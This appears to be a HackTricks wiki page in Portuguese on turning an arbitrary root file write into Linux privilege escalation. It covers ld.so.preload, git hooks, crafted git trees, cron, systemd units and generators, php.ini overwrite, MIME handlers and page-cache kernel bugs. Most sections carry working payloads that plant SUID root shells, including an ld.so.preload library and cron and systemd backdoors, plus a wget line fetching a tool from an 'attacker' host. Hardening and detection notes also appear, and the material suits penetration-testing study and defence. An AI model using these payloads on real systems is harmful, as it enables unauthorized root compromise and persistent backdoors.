# Gravação Arbitrária de Arquivo no Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` é uma lista em todo o sistema de shared objects que o dynamic linker carrega antes de outros shared objects. O secure-execution mode aplica restrições adicionais ao preloading, portanto um library path como `/tmp/pe.so` não é uma técnica universal para binários SUID.\
Se você puder criar ou modificar esse arquivo, um processo que o carregue carregará a library listada antes de seus outros shared objects, permitindo a execução de código no contexto desse processo.<sup>[[12]](#references)</sup>

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** são scripts executáveis executados em eventos de um repositório, incluindo operações de commit e merge. Se um **script ou usuário privilegiado** realizar essas ações e um atacante puder **escrever na pasta `.git`**, o hook poderá ser usado para **escalação de privilégios**.<sup>[[13]](#references)</sup>

Por exemplo, é possível **gerar um script** em um git repo, dentro de **`.git/hooks`**, para que ele seja sempre executado quando um novo commit for criado:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Path traversal no export de uma árvore Git privilegiada

Um sincronizador privilegiado pode evitar um checkout e, em vez disso, enumerar um repositório influenciado pelo atacante com `git ls-tree`, ler cada blob com `git cat-file`, concatenar o nome do caminho informado a um diretório de staging e gravá-lo por conta própria. Isso se torna uma **escrita arbitrária de arquivo com os privilégios do sincronizador** quando combina `-c safe.directory=*` (desativando a proteção do Git contra repositórios pertencentes a outro usuário) com a ausência de uma verificação de contenção do destino. Um nome de entrada absoluto da árvore faz com que `os.path.join(stage, name)` do Python descarte `stage`; um nome relativo contendo `../` escapa quando o sistema de arquivos o resolve. Como a aplicação materializa a árvore bruta em vez de pedir ao Git para fazer o checkout, a rejeição de caminhos durante o checkout nunca protege o destino.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Procure este formato de código em serviços root, timers, agentes de deployment, importadores de templates e jobs de backup/restore:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Uma entrada de tree é codificada como `<mode> SP <name> NUL <raw object ID>`. A opção `git hash-object --literally` permite deliberadamente dados de objeto que a análise normal ou o `git fsck` podem rejeitar; assim, um clone descartável pode construir uma tree cujo nome de arquivo seja um destino absoluto. Este exemplo cria um blob de arquivo cron, encapsula a tree criada em um commit e move uma branch para ela; a exploração ainda exige permissão para atualizar um repositório consumido pelo job privilegiado e um servidor Git que aceite o objeto malformado.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
O hardening deve abranger tanto a ingestão do repositório quanto a operação final no filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Substitua `safe.directory=*` pelos repositórios exatos nos quais o serviço deve confiar e, sempre que possível, execute o processamento do repositório sem privilégios de root.
- Rejeite nomes absolutos e qualquer componente `.` ou `..` antes da materialização. Após a concatenação, faça a canonicalização e verifique se o destino continua dentro da root pretendida.
- Evite symlink races de verificação e abertura: abra relativamente a um descritor de diretório confiável e, no Linux, use `openat2()` com `RESOLVE_BENEATH` e `RESOLVE_NO_SYMLINKS` para paths controlados pelo atacante.
- Prefira um checkout normal em um diretório isolado em vez de reimplementar o checkout a partir da saída de plumbing. Se a ingestão de raw objects for necessária, habilite a validação no lado do receive, como `receive.fsckObjects=true`; não reduza os findings relacionados a path de `receive.fsck.*` necessários para rejeitar trees manipuladas.

### Arquivos de Cron e tempo

Se você puder **escrever arquivos relacionados ao cron que o root executa**, normalmente poderá obter code execution na próxima execução do job. Os alvos interessantes incluem:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- O próprio crontab do root em `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Timers do `systemd` e os services que eles acionam

Verificações rápidas:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Caminhos típicos de abuso:

- **Adicionar um novo cron job do root** a `/etc/crontab` ou a um arquivo em `/etc/cron.d/`
- **Substituir um script** já executado pelo `run-parts`
- **Criar um backdoor em um target de timer existente** modificando o script ou binário que ele inicia

Exemplo mínimo de payload de cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se você só puder escrever dentro de um diretório do cron usado pelo `run-parts`, coloque ali um arquivo executável:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` geralmente ignora nomes de arquivo contendo pontos; portanto, prefira nomes como `backup` em vez de `backup.sh`.<sup>[[15]](#references)</sup>
- Alguns sistemas usam timers do `systemd` em vez do cron clássico, mas a ideia do abuso é a mesma: **modificar o que o root executará posteriormente**.<sup>[[20]](#references)</sup>

### Arquivos de Service e Socket

Se você puder escrever **arquivos de unit do `systemd`** ou arquivos referenciados por eles, talvez consiga obter execução de código como root recarregando e reiniciando a unit ou aguardando o acionamento do caminho de ativação do service/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Os alvos interessantes incluem:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Substituições drop-in em `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binários de service referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Caminhos `EnvironmentFile=` graváveis carregados por um service root

Verificações rápidas:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Caminhos comuns de abuso:

- **Sobrescrever `ExecStart=`** em uma unidade de serviço de propriedade de root que você pode modificar
- **Adicionar um drop-in override** com um `ExecStart=` malicioso e limpar o antigo primeiro
- **Inserir um backdoor no script/binário** já referenciado pela unidade
- **Sequestrar um serviço ativado por socket** modificando o arquivo `.service` correspondente, que é iniciado quando o socket recebe uma conexão

Exemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Fluxo típico de ativação:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se você não puder reiniciar os serviços por conta própria, mas puder editar uma unit ativada por socket, talvez só precise **aguardar uma conexão de cliente** para disparar a execução do serviço com backdoor como root.<sup>[[17]](#references)</sup>

### systemd generator directories

**System generators** são executáveis iniciados pelo system manager antes de ele carregar os unit files, tanto durante a inicialização quanto durante o reload da configuração. Portanto, o acesso de escrita a um diretório de system-generator (ou a um executable generator existente) é uma primitiva direta de root-code-execution que pode ser facilmente ignorada quando uma auditoria verifica apenas arquivos `*.service` e `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

A ordem de busca usual é `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` e `/usr/lib/systemd/system-generators/` (algumas distribuições expõem `/lib/systemd/system-generators/` por meio da unificação de `/usr`). Um executável com o mesmo nome em um diretório anterior oculta o posterior. Não confunda esses **input executable directories** com `/run/systemd/generator`, `/run/systemd/generator.early` e `/run/systemd/generator.late`, que contêm a saída de units temporárias produzida pelos generators.<sup>[[35]](#references)</sup>

Verificações rápidas:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Um gerador recém-criado deve ter seu bit de execução definido. Se a primitiva de escrita controlar os bytes, mas não o modo, direcione-a para um gerador que já seja executável; truncá-lo no local normalmente preserva seus metadados. Se o próprio diretório for gravável, crie uma nova entrada e marque-a como executável.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Acionar `systemctl daemon-reload` no gerenciador do **sistema** requer autorização adequada, mas executa novamente todos os system generators; caso contrário, aguarde um reload privilegiado, uma operação de pacote ou uma reinicialização. Diretórios de user-generators, como `~/.config/systemd/user-generators/`, são executados no gerenciador do usuário e, por si só, **não** fornecem acesso root.<sup>[[35]](#references)</sup>

Para hardening e hunting, verifique cada componente do caminho e a ACL, em vez de apenas os bits de modo finais; crie uma baseline dos hashes e da propriedade dos pacotes dos generators; e gere alertas para alterações de criação, renomeação, conteúdo ou permissões em todos os diretórios de entrada dos system-generators. Monitorar a escrita é importante porque um generator one-shot pode se excluir após a execução, enquanto a árvore de units gerada em `/run/systemd/generator*` é reconstruída no próximo reload.<sup>[[35]](#references)[[36]](#references)</sup>

### Sobrescrever um `php.ini` restritivo usado por um sandbox PHP privilegiado

Alguns daemons personalizados validam PHP fornecido pelo usuário executando `php` com um **`php.ini` restritivo** (por exemplo, `disable_functions=exec,system,...`). Se o código no sandbox ainda tiver **qualquer primitiva de escrita** (como `file_put_contents`) e você conseguir alcançar o **caminho exato do `php.ini`** usado pelo daemon, poderá **sobrescrever essa configuração** para remover as restrições e, em seguida, enviar um segundo payload que será executado com privilégios elevados.<sup>[[2]](#references)</sup>

Fluxo típico:

1. O primeiro payload sobrescreve a configuração do sandbox.
2. O segundo payload executa o código agora que as funções perigosas foram reativadas.

Exemplo mínimo (substitua pelo caminho usado pelo daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se o daemon for executado como root (ou validar usando paths pertencentes ao root), a segunda execução resulta em um contexto root. Isso é essencialmente **privilege escalation via config overwrite** quando o runtime em sandbox ainda consegue escrever arquivos.

### binfmt_misc

`binfmt_misc` expõe registrations em `/proc/sys/fs/binfmt_misc`; cada registration associa um padrão de tipo de arquivo a um interpreter. O impacto nos privilégios depende de quem pode alterar a registration e de qual processo executará posteriormente o arquivo correspondente; portanto, verifique esses requisitos antes de considerar isso um caminho de privilege escalation.<sup>[[21]](#references)</sup>

### Sobrescrever schema handlers (como http: ou https:)

Desktop environments usam associações MIME e desktop entries para escolher um aplicativo para URI schemes; um atacante que possa escrever na configuração relevante por usuário e nos diretórios de desktop entries pode redirecionar esses schemes para um launcher sob seu controle. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os handlers de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), um clique do usuário pode invocar essa desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root executando scripts/binários graváveis pelo usuário

Se um fluxo privilegiado executar algo como `/bin/sh /home/username/.../script` (ou qualquer binário dentro de um diretório pertencente a um usuário sem privilégios), você pode sequestrá-lo:<sup>[[1]](#references)</sup>

- **Detectar a execução:** monitore os processos com pspy para identificar o root invocando caminhos controlados pelo usuário.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** certifique-se de que tanto o arquivo-alvo quanto o diretório pertencem ao seu usuário e podem ser gravados por ele.
- **Hijack the target:** faça backup do binário/script original e insira um payload que crie um shell SUID (ou execute qualquer outra ação como root); depois, restaure as permissões:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Acione a ação privilegiada** (por exemplo, pressionar um botão da UI que inicia o helper). Quando o root executar novamente o path sequestrado, obtenha o shell escalado com `./rootshell -p`.

### Modificação somente do page cache de arquivos binários privilegiados

Alguns bugs do kernel não modificam o arquivo **no disco**. Em vez disso, permitem modificar apenas a **cópia no page cache de um arquivo legível**. Se você conseguir atingir um binário **setuid** ou executado de outra forma pelo **root**, a próxima execução poderá rodar bytes controlados pelo atacante a partir da memória e escalar privilégios, mesmo que o hash do arquivo no disco permaneça inalterado.<sup>[[3]](#references)[[4]](#references)</sup>

É útil pensar nisso como uma **primitive de escrita de arquivo somente em runtime**:<sup>[[3]](#references)</sup>

- **O disco permanece limpo**: o inode e os bytes no disco não mudam
- **A memória fica suja**: processos que leem/executam a página em cache recebem o conteúdo modificado pelo atacante
- **O efeito é temporário**: a alteração desaparece após reboot ou eviction do cache

Essa primitive fica entre a **arbitrary file write** clássica e os bugs mais antigos de **page-cache abuse**, como Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW dependia de uma race
- Dirty Pipe tinha restrições sobre a posição de escrita
- Uma primitive somente de page cache pode ser mais confiável se o path vulnerável fornecer escritas diretas em páginas cached file-backed

#### Fluxo genérico de privesc

1. Obtenha uma primitive do kernel capaz de escrever em **páginas file-backed do page cache**
2. Use-a contra um **binário privilegiado legível** ou outro arquivo executado pelo root
3. Acione a execução **antes** que a página seja removida do cache
4. Obtenha code execution como root enquanto o arquivo no disco ainda parece inalterado

Alvos típicos de alto valor:

- Binários **setuid-root**
- Helpers iniciados por **serviços root**
- Binários normalmente executados a partir de **containers que compartilham o kernel/page cache do host**

#### Path de exemplo com AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) é um bom exemplo dessa classe. O path vulnerável estava na API de crypto userspace do Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` pode mover referências a páginas do page cache de um arquivo legível para o scatterlist TX da crypto
- o path de decrypt in-place de `algif_aead` reutilizava os buffers de origem e destino
- `authencesn` então escrevia na região de tag do destino
- quando essa região ainda referenciava páginas file-backed spliced, a escrita atingia o **page cache do arquivo-alvo**

Portanto, a técnica interessante não é o CVE em si, mas o padrão:

- **alimentar páginas cached file-backed em um subsistema do kernel**
- fazer o subsistema **tratá-las como output gravável**
- acionar uma pequena sobrescrita controlada na memória

O PoC público usava **escritas repetidas de 4 bytes** para modificar `/usr/bin/su` na memória e depois executá-lo.<sup>[[4]](#references)[[7]](#references)</sup>

#### Path de exemplo com ESP / XFRM + clone TEE do netfilter

DirtyClone (CVE-2026-43503) mostra outra variante do mesmo padrão de **page-cache-only write-to-root**, mas desta vez o sink é o **decrypt IPsec ESP**, em vez de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

A técnica importante é a **etapa de metadata-laundering**:

- `splice()` coloca uma **página read-only file-backed do page cache** em um pacote ESP-in-UDP
- a mitigação original do DirtyFrag marcava esse skb com `SKBFL_SHARED_FRAG`, para que `esp_input()` **fizesse uma cópia antes do decrypt**
- o netfilter `TEE` duplica o pacote por meio de `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- o clone mantém a **mesma referência física à página do page cache**, mas perde `SKBFL_SHARED_FRAG`
- `esp_input()` então trata o clone como seguro e executa o decrypt **in-place de `cbc(aes)`** sobre a página file-backed

Portanto, a lição para o reviewer é mais ampla que o CVE: se uma mitigação depende de **metadata de skb/página** para decidir se uma operação precisa fazer uma cópia primeiro, qualquer **path de clone/cópia que preserve a página de backing, mas descarte os metadados** pode reabrir silenciosamente a primitive de escrita.

Fluxo típico de exploitation:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para obter **`CAP_NET_ADMIN` dentro de um network namespace privado**
2. ativar o loopback e instalar uma **regra `TEE` do netfilter** em `mangle/OUTPUT`
3. instalar **SAs de transporte XFRM ESP** via `NETLINK_XFRM`
4. codificar cada palavra de 4 bytes desejada no campo `seq_hi` da SA (o word-selection trick do DirtyFrag)
5. enviar o pacote ESP-in-UDP spliced para que o **clone do `TEE`** alcance `esp_input()` e faça o decrypt **in-place**
6. repetir até que a cópia no page cache de `/usr/bin/su` ou de outro executável privilegiado contenha code controlado pelo atacante

Operacionalmente, o impacto é o mesmo do exemplo com `AF_ALG`: o arquivo no disco permanece limpo, mas `execve()` consome os **bytes modificados do page cache** e fornece root.<sup>[[8]](#references)[[9]](#references)</sup>

Verificações úteis de exposição para essa variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
A redução de curto prazo da attack surface também é específica ao caminho neste caso: atualizar para um kernel que contenha `48f6a5356a33` corrige o caminho de clone, enquanto bloquear o autoload de `xt_TEE` remove a **etapa de laundering de flags** e bloquear `esp4` / `esp6` remove o **sink de descriptografia**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposição e hunting

Se você suspeitar dessa classe de bug, não dependa apenas das verificações de integridade do disco. Verifique também:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Os valores de configuração abaixo distinguem uma interface carregável de uma incorporada ao kernel; as regras de build de crypto mapeiam `CONFIG_CRYPTO_USER_API_AEAD` para `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` pode ser carregável/descarregável como um módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: a interface é incorporada ao kernel
- binários setuid são bons alvos porque um patch que afete apenas o page cache pode ser suficiente para transformar um foothold local em root

#### Redução da superfície de ataque para o caminho `algif_aead`

Se a interface vulnerável for fornecida por um módulo carregável:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se for compilado no kernel, algumas divulgações relataram o bloqueio do caminho init com:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Esse tipo de mitigação também vale a pena ser lembrado para outros kernel LPEs: se a exploração depender de uma interface opcional específica, desabilitar ou colocar essa interface na blacklist pode interromper o caminho de exploração mesmo antes que uma atualização completa do kernel esteja disponível.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ do Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgação do CVE-2026-31431 no Openwall oss-security](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correção do Linux stable: crypto: algif_aead - Reverter para a operação out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Advisory do Copy Fail — CVE-2026-31431](https://copy.fail/)
- [7] [Análise técnica da Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repositório / README do DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Dissecando e explorando a variante de Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correção do Linux: net: skb: preservar `SKBFL_SHARED_FRAG` em `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigação anterior do Linux: definir `SKBFL_SHARED_FRAG` para pacotes UDP em splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — página do manual do Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — página do manual do Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentação do Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associações de aplicações MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Especificação de Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Especificação de Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Linguagem Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile de crypto do Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilidade de page cache do Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentação do Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentação do Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentação de configuração do Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — página do manual do Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentação de generators do systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: mecanismos de persistência](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
